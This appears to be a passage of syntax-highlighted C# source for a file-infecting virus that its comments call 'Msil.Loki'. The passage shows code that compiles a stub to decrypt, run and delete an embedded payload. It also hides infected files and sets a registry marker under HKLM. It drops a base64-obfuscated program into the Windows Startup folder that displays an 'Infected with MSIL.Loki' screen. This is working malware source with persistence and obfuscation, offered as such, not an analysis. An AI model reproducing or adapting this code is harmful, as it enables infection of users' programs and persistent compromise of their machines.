                     </span><span class="sc6">"      while((data = cs.ReadByte()) != -1) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"          o.WriteByte((byte)data); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      o.Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      cs.Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      fr.Close(); \n"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
           
            </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"          if(File.Exists(inf)) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 
            </span><span class="sc6">"                   File.Delete(inf); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               Thread t = new Thread(new ThreadStart("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">r2</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">n2</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">")); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               t.Start(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"           } catch (Exception er) { \n  \n } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"       } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"       private static void "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">r2</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">n2</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"() { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"           try { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               Process.Start(outf).WaitForExit(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               File.Delete(outf); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"           } catch { } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"       } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"       \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 
            </span><span class="sc6">"   } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"} \n"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">CompilerResults</span><span class="sc0"> </span><span class="sc11">results</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ic</span><span class="sc10">.</span><span class="sc11">CompileAssemblyFromSource</span><span class="sc10">(</span><span class="sc11">cp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc2">//check to make the sure the file is there if it is then set it to hidden
</span><span class="sc0">        </span><span class="sc2">//note:the key that we use may sometimes generate characters that will escape
</span><span class="sc0">            </span><span class="sc2">//the string. I didn't bother fixing this only because it makes it more of a 
</span><span class="sc0">        </span><span class="sc2">//sparse infector. Granted it won't happen everytime but just a weird quirk
</span><span class="sc0">            
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">SetAttributes</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAttributes</span><span class="sc10">.</span><span class="sc11">Hidden</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc2">//generator of random words!
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">[</span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">)];</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Generatekey</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc2">//based on which encryption we use we can build our keys dynamically also
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">e</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">DESCryptoServiceProvider</span><span class="sc0"> </span><span class="sc11">desCrypto</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DESCryptoServiceProvider</span><span class="sc10">)</span><span class="sc11">DESCryptoServiceProvider</span><span class="sc10">.</span><span class="sc11">Create</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">setKey</span><span class="sc10">(</span><span class="sc11">ASCIIEncoding</span><span class="sc10">.</span><span class="sc11">ASCII</span><span class="sc10">.</span><span class="sc11">GetString</span><span class="sc10">(</span><span class="sc11">desCrypto</span><span class="sc10">.</span><span class="sc11">Key</span><span class="sc10">));</span><span class="sc0">
                </span><span class="sc11">setEncm</span><span class="sc10">(</span><span class="sc11">e</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">TripleDESCryptoServiceProvider</span><span class="sc0"> </span><span class="sc11">tDESalg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">TripleDESCryptoServiceProvider</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">setKey</span><span class="sc10">(</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToBase64String</span><span class="sc10">(</span><span class="sc11">tDESalg</span><span class="sc10">.</span><span class="sc11">Key</span><span class="sc10">));</span><span class="sc0">
                </span><span class="sc11">setIV</span><span class="sc10">(</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToBase64String</span><span class="sc10">(</span><span class="sc11">tDESalg</span><span class="sc10">.</span><span class="sc11">IV</span><span class="sc10">));</span><span class="sc0">
                </span><span class="sc11">setEncm</span><span class="sc10">(</span><span class="sc11">e</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">Check</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//our check to the registry if we ran it already
</span><span class="sc0">            </span><span class="sc2">//all this decides is if we show our message since
</span><span class="sc0">            </span><span class="sc2">//we don't really need to everytime an infected file is launched
</span><span class="sc0">            </span><span class="sc2">//although it would be annoying enough...
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">regstr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc10">)</span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">GetValue</span><span class="sc10">(</span><span class="sc13">@"HKEY_LOCAL_MACHINE\SOFTWARE\Loki"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Loki"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Loki"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">regstr</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"Loki"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">RegistryKey</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">LocalMachine</span><span class="sc10">.</span><span class="sc11">OpenSubKey</span><span class="sc10">(</span><span class="sc6">"Software"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">RegistryKey</span><span class="sc0"> </span><span class="sc11">newkey</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">.</span><span class="sc11">CreateSubKey</span><span class="sc10">(</span><span class="sc6">"Loki"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">newkey</span><span class="sc10">.</span><span class="sc11">SetValue</span><span class="sc10">(</span><span class="sc6">"Loki"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Loki"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">GenerateMsg</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc2">//this is cool. it's a little screensaver
</span><span class="sc0">            </span><span class="sc2">//that gets built dynamically. That says You've been infected
</span><span class="sc0">            </span><span class="sc2">//with Msil.Loki by free0n. It even jumps around the screen
</span><span class="sc0">            </span><span class="sc2">//:) Nice to try new things instead of just a message box
</span><span class="sc0">
            </span><span class="sc11">ICodeCompiler</span><span class="sc0"> </span><span class="sc11">ic</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">CSharpCodeProvider</span><span class="sc10">().</span><span class="sc11">CreateCompiler</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">CompilerParameters</span><span class="sc0"> </span><span class="sc11">cp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">CompilerParameters</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetFolderPath</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">SpecialFolder</span><span class="sc10">.</span><span class="sc11">Startup</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">100000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".exe"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">ReferencedAssemblies</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc6">"System.dll"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">ReferencedAssemblies</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc6">"System.Windows.Forms.dll"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">ReferencedAssemblies</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc6">"System.Data.dll"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">ReferencedAssemblies</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc6">"System.Drawing.dll"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">GenerateExecutable</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">CompilerOptions</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"/target:winexe"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">OutputAssembly</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">DeCode</span><span class="sc10">(</span><span class="sc6">"dXNpbmcgU3lzdGVtOyAKdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"IAp1c2luZyBTeXN0ZW0uQ29tcG9uZW50TW9kZWw7IAp1c2luZyBTeXN0ZW0uRGF0"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"YTsgCnVzaW5nIFN5c3RlbS5EcmF3aW5nOyAKdXNpbmcgU3lzdGVtLlRleHQ7IAp1"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"c2luZyBTeXN0ZW0uV2luZG93cy5Gb3JtczsgCm5hbWVzcGFjZSBzY3IgeyAKc3Rh"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"dGljIGNsYXNzIFByb2dyYW0gewogICBbU1RBVGhyZWFkXQogICBzdGF0aWMgdm9p"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"ZCBNYWluKCkgewpBcHBsaWNhdGlvbi5FbmFibGVWaXN1YWxTdHlsZXMoKTsKQXBw"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"bGljYXRpb24uU2V0Q29tcGF0aWJsZVRleHRSZW5kZXJpbmdEZWZhdWx0KGZhbHNl"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"KTsKQXBwbGljYXRpb24uUnVuKG5ldyBGb3JtMSgpKTsgCn0gCn0gCnBhcnRpYWwg"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"Y2xhc3MgRm9ybTEgewpwcml2YXRlIFN5c3RlbS5Db21wb25lbnRNb2RlbC5JQ29u"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"dGFpbmVyIGNvbXBvbmVudHMgPSBudWxsOwpwcm90ZWN0ZWQgb3ZlcnJpZGUgdm9p"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"ZCBEaXNwb3NlKGJvb2wgZGlzcG9zaW5nKSB7CmlmIChkaXNwb3NpbmcgJiYgKGNv"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"bXBvbmVudHMgIT0gbnVsbCkpIHsKY29tcG9uZW50cy5EaXNwb3NlKCk7Cn0KYmFz"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"ZS5EaXNwb3NlKGRpc3Bvc2luZyk7Cn0KcHJpdmF0ZSB2b2lkIEluaXRpYWxpemVD"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"b21wb25lbnQoKSB7CnRoaXMuY29tcG9uZW50cyA9IG5ldyBTeXN0ZW0uQ29tcG9u"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"ZW50TW9kZWwuQ29udGFpbmVyKCk7CnRoaXMubGFiZWwxID0gbmV3IFN5c3RlbS5X"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"aW5kb3dzLkZvcm1zLkxhYmVsKCk7CnRoaXMudGltZXIxID0gbmV3IFN5c3RlbS5X"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"aW5kb3dzLkZvcm1zLlRpbWVyKHRoaXMuY29tcG9uZW50cyk7CnRoaXMuU3VzcGVu"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"ZExheW91dCgpOwp0aGlzLmxhYmVsMS5BdXRvU2l6ZSA9IHRydWU7CnRoaXMubGFi"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"ZWwxLkJhY2tDb2xvciA9IFN5c3RlbS5EcmF3aW5nLkNvbG9yLkJsYWNrOwp0aGlz"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"LmxhYmVsMS5Gb250ID0gbmV3IFN5c3RlbS5EcmF3aW5nLkZvbnQoIk1pY3Jvc29m"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"dCBTYW5zIFNlcmlmIiwgMjRGLCBTeXN0ZW0uRHJhd2luZy5Gb250U3R5bGUuUmVn"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"dWxhciwgU3lzdGVtLkRyYXdpbmcuR3JhcGhpY3NVbml0LlBvaW50LCAoKGJ5dGUp"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"KDApKSk7CnRoaXMubGFiZWwxLkZvcmVDb2xvciA9IFN5c3RlbS5EcmF3aW5nLkNv"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"bG9yLlJlZDsKdGhpcy5sYWJlbDEuTG9jYXRpb24gPSBuZXcgU3lzdGVtLkRyYXdp"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"bmcuUG9pbnQoMTIsIDIwMSk7CnRoaXMubGFiZWwxLk5hbWUgPSAibGFiZWwxIjsK"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"dGhpcy5sYWJlbDEuU2l6ZSA9IG5ldyBTeXN0ZW0uRHJhd2luZy5TaXplKDAsIDM3"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"KTsKdGhpcy5sYWJlbDEuVGFiSW5kZXggPSAwOwp0aGlzLnRpbWVyMS5UaWNrICs9"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"IG5ldyBTeXN0ZW0uRXZlbnRIYW5kbGVyKHRoaXMudGltZXIxX1RpY2spOwp0aGlz"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"LkF1dG9TY2FsZURpbWVuc2lvbnMgPSBuZXcgU3lzdGVtLkRyYXdpbmcuU2l6ZUYo"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"NkYsIDEzRik7CnRoaXMuQXV0b1NjYWxlTW9kZSA9IFN5c3RlbS5XaW5kb3dzLkZv"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"cm1zLkF1dG9TY2FsZU1vZGUuRm9udDsKdGhpcy5CYWNrZ3JvdW5kSW1hZ2VMYXlv"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"dXQgPSBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5JbWFnZUxheW91dC5TdHJldGNoOwp0"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"aGlzLkNsaWVudFNpemUgPSBuZXcgU3lzdGVtLkRyYXdpbmcuU2l6ZSg0NzIsIDQ1"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"OSk7CnRoaXMuQ29udHJvbHMuQWRkKHRoaXMubGFiZWwxKTsKdGhpcy5Eb3VibGVC"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"dWZmZXJlZCA9IHRydWU7CnRoaXMuRm9ybUJvcmRlclN0eWxlID0gU3lzdGVtLldp"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"bmRvd3MuRm9ybXMuRm9ybUJvcmRlclN0eWxlLk5vbmU7CnRoaXMuTmFtZSA9ICJG"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"b3JtMSI7CnRoaXMuU2hvd0luVGFza2JhciA9IGZhbHNlOwp0aGlzLlRvcE1vc3Qg"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"PSB0cnVlOwp0aGlzLldpbmRvd1N0YXRlID0gU3lzdGVtLldpbmRvd3MuRm9ybXMu"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"Rm9ybVdpbmRvd1N0YXRlLk1heGltaXplZDsKdGhpcy5Mb2FkICs9IG5ldyBTeXN0"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"ZW0uRXZlbnRIYW5kbGVyKHRoaXMuRm9ybTFfTG9hZF8xKTsKdGhpcy5SZXN1bWVM"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"YXlvdXQoZmFsc2UpOwp0aGlzLlBlcmZvcm1MYXlvdXQoKTsKfQpwcml2YXRlIFN5"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"c3RlbS5XaW5kb3dzLkZvcm1zLkxhYmVsIGxhYmVsMTsKcHJpdmF0ZSBTeXN0ZW0u"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"V2luZG93cy5Gb3Jtcy5UaW1lciB0aW1lcjE7Cn0gCnB1YmxpYyBwYXJ0aWFsIGNs"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"YXNzIEZvcm0xIDogRm9ybSB7IApwdWJsaWMgRm9ybTEoKSB7IApJbml0aWFsaXpl"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"Q29tcG9uZW50KCk7IAp9IApwcm90ZWN0ZWQgb3ZlcnJpZGUgdm9pZCBPblBhaW50"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"QmFja2dyb3VuZChQYWludEV2ZW50QXJncyBlKSB7IAplLkdyYXBoaWNzLkRyYXdS"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"ZWN0YW5nbGUobmV3IFBlbihDb2xvci5CbGFjayksIDAsIDAsIFNpemUuV2lkdGgs"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"IFNpemUuSGVpZ2h0KTsgCn0gCnByaXZhdGUgdm9pZCBGb3JtMV9Mb2FkXzEob2Jq"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"ZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpIHsgCnRoaXMuU2V0U3R5bGUoQ29udHJv"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"bFN0eWxlcy5PcHRpbWl6ZWREb3VibGVCdWZmZXIgfCBDb250cm9sU3R5bGVzLlVz"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"ZXJQYWludCB8IENvbnRyb2xTdHlsZXMuQWxsUGFpbnRpbmdJbldtUGFpbnQsIHRy"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"dWUpOyAKdGhpcy5DYXB0dXJlID0gdHJ1ZTsgCkN1cnNvci5IaWRlKCk7IApCb3Vu"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"ZHMgPSBTY3JlZW4uUHJpbWFyeVNjcmVlbi5Cb3VuZHM7IApXaW5kb3dTdGF0ZSA9"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"IEZvcm1XaW5kb3dTdGF0ZS5NYXhpbWl6ZWQ7IApTaG93SW5UYXNrYmFyID0gZmFs"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"c2U7IApEb3VibGVCdWZmZXJlZCA9IHRydWU7IApCYWNrZ3JvdW5kSW1hZ2VMYXlv"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"dXQgPSBJbWFnZUxheW91dC5TdHJldGNoOyAKdGltZXIxLkludGVydmFsID0gMTAw"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"MDsgCnRpbWVyMS5TdGFydCgpOyAKfSAKcHJpdmF0ZSB2b2lkIHNjcm9sbCgpIHsg"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"CmxhYmVsMS5UZXh0ID0gIkluZmVjdGVkIHdpdGggTVNJTC5Mb2tpIGJ5IGZyZWUw"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"biB8IERvb21SaWRlcnoiOyAKUmFuZG9tIHIgPSBuZXcgUmFuZG9tKCk7IApsYWJl"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"bDEuU2V0Qm91bmRzKHIuTmV4dCgxMDApLCByLk5leHQoMTAwMCksIHIuTmV4dCgx"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"MDAwKSwgci5OZXh0KDEwMDApKTsKfQpwcml2YXRlIHZvaWQgdGltZXIxX1RpY2so"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                              </span><span class="sc6">"b2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpIHsKc2Nyb2xsKCk7Cn0KfSAKfSAK"</span><span class="sc10">);</span><span class="sc0">

